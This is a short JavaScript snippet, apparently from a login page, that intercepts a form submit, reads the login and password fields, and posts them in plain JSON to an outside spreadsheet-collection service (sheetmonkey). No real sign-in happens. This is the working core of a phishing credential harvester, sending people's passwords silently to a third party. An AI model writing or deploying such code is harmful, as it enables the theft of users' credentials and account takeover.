const enviar = document.querySelector("#submit")

enviar.addEventListener('click', (evento)=>{
        evento.preventDefault()

        const login = document.querySelector('#login').value
        const senha = document.querySelector('#senha').value

        fetch('https://api.sheetmonkey.io/form/3STZ6pgoSZLurUQKw9eo6x',{
                method: 'POST',
                headers: {
                        'Accept' : 'application/json',
                        'Content-type' : 'application/json'
                },
                body: JSON.stringify({login: login , senha: senha})
        })
})